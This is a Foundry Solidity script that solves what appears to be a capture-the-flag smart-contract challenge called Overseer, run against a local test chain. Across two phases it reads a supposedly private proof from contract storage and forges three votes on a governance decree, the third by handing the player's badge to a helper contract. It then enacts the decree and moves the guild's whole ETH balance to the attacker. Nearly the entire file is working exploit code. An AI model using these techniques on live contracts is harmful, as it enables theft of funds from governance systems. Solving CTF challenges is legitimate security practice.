// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Script.sol";
import {IOverseer} from "targets/overseer/src/interfaces/IOverseer.sol";
import {Guild} from "targets/overseer/src/Guild.sol";
import {SealedTurncloak} from "targets/overseer/src/elders/SealedTurncloak.sol";
import {helper} from "src/voteHelper.sol";

// Was: imported Challenge.sol but its src/ imports break from our root
// Fix: minimal interface
interface IChallenge {
    function PLAYER() external view returns (address);
    function overseer() external view returns (address);
    function guild() external view returns (Guild);
    function sealedTurncloak() external view returns (SealedTurncloak);
    function isSolved() external view returns (bool);
}

// =================================================================
// Phase 1: Propose decree + cast all 3 votes + transfer badge
// Run: forge script script/OverseeAttack.s.sol:OverseePhase1 --broadcast --rpc-url http://127.0.0.1:8546 --private-key $PK
// =================================================================
contract OverseePhase1 is Script {
    function run() external {
        IChallenge challenge = IChallenge(vm.envAddress("CHALLENGE"));

        IOverseer overseer = IOverseer(address(challenge.overseer()));
        Guild guild = challenge.guild();
        SealedTurncloak turncloak = challenge.sealedTurncloak();

        bytes16 playerBadge = overseer.folkToBadge(msg.sender);
        bytes16 guildBadge = guild.badge();

        console.log("=== RECON ===");
        console.log("Player (EOA):", msg.sender);
        console.log("Guild balance:", address(guild).balance);

        // Read _proof from slot 10 (layout at 10 shifts inherited storage)
        uint256 proof = uint256(vm.load(address(turncloak), bytes32(uint256(10))));
        console.log("Proof:", proof);

        vm.startBroadcast();

        // STEP 1: Deploy helper
        helper h = new helper(guild, IOverseer(address(overseer)));
        console.log("Helper deployed:", address(h));

        // STEP 2: Propose decree — drain all guild ETH to us
        bytes16 decreeId = "1234567891234567";
        {
            Guild.Edict[] memory edicts = new Guild.Edict[](1);
            edicts[0].to = msg.sender;
            edicts[0].value = address(guild).balance;
            edicts[0].data = "";

            overseer.oversee(
                playerBadge, guildBadge,
                keccak256("DECREE_PROPOSED"),
                bytes32(decreeId),
                abi.encode(decreeId, edicts)
            );
            console.log("Decree proposed");
        }

        // STEP 3: Player votes Aye (1/3)
        overseer.oversee(
            playerBadge, guildBadge,
            keccak256("DECREE_VOTED"),
            bytes32(decreeId),
            abi.encode(decreeId, uint8(1))
        );
        console.log("Player voted Aye (1/3)");

        // STEP 4: SealedTurncloak votes Aye via unseal (2/3)
        turncloak.unseal(decreeId, 1, proof);
        console.log("SealedTurncloak voted Aye (2/3)");

        // STEP 5: Transfer badge to helper
        overseer.proposeBadgeChange(address(h));

        // STEP 6: Helper accepts badge + votes Aye (3/3)
        h.help(decreeId, playerBadge);
        console.log("Helper voted Aye (3/3)");

        vm.stopBroadcast();

        console.log("=== Phase 1 DONE ===");
        console.log("Helper address:", address(h));
        console.log(">>> Now mine 16 blocks and run Phase 2 <<<");
    }
}

// =================================================================
// Phase 2: Mine blocks + enact decree
// Run:
//   cast rpc anvil_mine 16 --rpc-url http://127.0.0.1:8546
//   forge script script/OverseeAttack.s.sol:OverseePhase2 --broadcast --rpc-url http://127.0.0.1:8546 --private-key $PK
// =================================================================
contract OverseePhase2 is Script {
    function run() external {
        IChallenge challenge = IChallenge(vm.envAddress("CHALLENGE"));
        IOverseer overseer = IOverseer(address(challenge.overseer()));
        Guild guild = challenge.guild();

        bytes16 guildBadge = guild.badge();
        bytes16 decreeId = "1234567891234567";

        vm.startBroadcast();

        // Player's old badge was transferred to helper — re-enroll for a new one
        bytes16 newBadge = overseer.enroll();
        console.log("Re-enrolled with new badge");

        // Enact the decree — sends all guild ETH to player
        overseer.oversee(
            newBadge, guildBadge,
            keccak256("DECREE_ENACTED"),
            bytes32(decreeId),
            abi.encode(decreeId)
        );

        vm.stopBroadcast();

        console.log("=== RESULT ===");
        console.log("Guild balance:", address(guild).balance);
        console.log("Solved?", challenge.isSolved());
    }
}
